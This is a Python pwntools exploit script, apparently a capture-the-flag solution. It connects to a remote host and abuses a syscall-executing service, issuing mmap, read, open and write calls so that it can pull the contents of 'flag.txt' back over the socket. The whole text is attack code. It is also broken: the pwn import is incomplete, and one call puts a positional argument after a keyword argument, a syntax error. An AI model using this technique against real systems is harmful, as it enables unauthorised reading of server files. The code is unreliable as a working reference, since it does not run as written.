#!/usr/bin/python
from pwn import 
conn = remote('jh2i.com', 50016)
STDIN = 0
STDOUT = 1 

def get_new_mem(size):
    global conn
    conn.send("%d\n" %(9)) #syscall for mmap
    d = conn.recv() 
    #addr
    conn.send("%d\n" %(0))
    d = conn.recv()
    #size
    conn.send("%d\n" %(size))
    d = conn.recv()
    #protection flag
    conn.send("%d\n" %(3))
    d = conn.recv()
    #flags 
    conn.send("%d\n" %(34))
    d = conn.recv()
    #fd 
    conn.send("%d\n" %(0))
    d = conn.recv()
    #offset
    conn.send("%d\n" %(0))
    address = conn.recv()
    return address

def write_to_buff(data, addr, sockfd):
    global conn
    #syscall for read: 0 
    conn.send("%d\n" %(0))
    d = conn.recv()
    #target fd
    conn.send("%d\n" %(sockfd))
    d = conn.recv()
    #buffer
    conn.send("%d\n" %(addr))
    d = conn.recv()
    #size
    if data: 
        conn.send("%d\n" %(len(data)))
    else: 
        conn.send("%d\n" %(128))
    d = conn.recv()

    # extra
    conn.send("%d\n" %(0))
    d = conn.recv()
    conn.send("%d\n" %(0))
    d = conn.recv()
    conn.send("%d\n" %(0))

    if data: #send the data 
        conn.send(data + "\n")
    conn.send("\n")
    d = conn.recv()
    return d

def read_from_buff(addr, size, sockfd):
    global conn

    #write to fd
    #syscall for write
    conn.send("%d\n" %(1))
    d = conn.recv()
    #target fd
    conn.send("%d\n" %(sockfd))
    d = conn.recv()
    #buffer
    conn.send("%d\n" %(addr))
    d = conn.recv()
    #size
    conn.send("%d\n" %(size))
    d = conn.recv()

    #extra
    conn.send("%d\n" %(0))
    d = conn.recv()
    conn.send("%d\n" %(0))
    d = conn.recv()
    conn.send("%d\n" %(0))
    d = conn.recv()
    return d

def open_file(address):
    conn.send("%d\n" %(2)) #syscall for open - 2
    d = conn.recv() #read prompt
    conn.send("%d\n" %(address)) #arg2 for open -> buffer_addr
    d = conn.recv() #read prompt
    conn.send("%d\n" %(0)) #read only mode - flag
    d = conn.recv() #read prompt

    #extra
    conn.send("%d\n" %(0))
    d = conn.recv() #read prompt
    conn.send("%d\n" %(0))
    d = conn.recv() #read prompt
    conn.send("%d\n" %(0))
    d = conn.recv()#read prompt
    conn.send("%d\n" %(0))
    d = conn.recv() #read prompt
    return d

def main():
    global conn
    #recv banner from remote target
    d = conn.recv()
    #get new buff
    print("[+] Getting new buffer...", end="")
    address = get_new_mem(100)
    address = int(address.strip().split('\n'.encode())[0].split()[1], 16)
    print("[+] New buffer at address: %x" %(address))

    #write filename to buff 
    print("[+] Writng to buffer...", end="")
    wb = write_to_buff("flag.txt", address, STDIN)
    wb = int(wb.strip().split()[1], 16)
    print("[+] Size of Data written to buffer: %d" %(wb))

    #call open on file
    print("[+] Open File for read...", end="")
    filefd = open_file(address)
    filefd = int(filefd.strip().split('\n'.encode())[0].split()[1], 16)
    print("[+]File fd: %d" %(filefd))

    #read from file fd to address 
    print("[+] Reading from file fd to buffer...", end="")
    wb2 = write_to_buff(data = "", address+20, filefd)
    wb2 = int(wb2.strip().split('\n'.encode())[0].split()[1], 16)
    print("[+] Number of bytes read from file... %d" %(wb2))

    #read from buff 2 to stdout - 4 bytes t a time
    print("[+] Reading file content from buffer...", end="")
    rb = read_from_buff(address+20, wb2, STDOUT)
    rb = rb.strip().split('\00'.encode())[0]
    print("[+] File content retrived from buffer...")
    print("#"*30)
    conn.close()

if __name__ == "__main__":
    main()
